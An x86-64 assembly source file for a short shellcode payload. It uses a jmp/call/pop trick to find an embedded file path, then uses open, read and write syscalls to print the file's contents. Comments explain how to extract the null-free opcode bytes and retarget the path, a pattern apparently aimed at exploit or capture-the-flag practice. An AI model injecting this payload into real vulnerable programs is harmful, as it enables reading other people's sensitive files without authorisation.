#
# gcc -nostdlib -o open-read-write-x86_64 open-read-write-x86_64.s
# for i in $(objdump -d -M intel open-read-write-x86_64 | grep "^ " | cut -f2); do
#     echo -n "\x$i"
# done
#
# Change line 17 and line 48 simultaneously 
#
.intel_syntax noprefix
.global _start

_start:
	jmp REL_JMP
REL_CALL:
	pop rdi             # addr
	xor rax, rax
	mov [rdi + 13], al   # NUL to terminate string
	push rax
	pop rsi             # rsi => 0
	push 04
	pop rdx             # rdx => 04
	push 0x2
	pop rax             # eax => 2 (open() syscall)
	syscall

	mov rsi, rdi        # rsi => buf
	mov rdi, rax        # rdi => fd
	push 0x7f
	pop rdx             # rdx => count
	xor rax, rax        # rax => 0 (read() syscall)
	syscall

	mov rdx, rax        # rdx => count
	push 0x1
	pop rdi             # rdi => fd
	push 0x1
	pop rax             # rax => 1 (write() syscall)
	syscall

EXIT:
	xor rdi, rdi
	push 60 
	pop rax             # rax => 60 (exit() syscall)
	syscall

REL_JMP:
	call REL_CALL
	.ascii "/path/to/file"
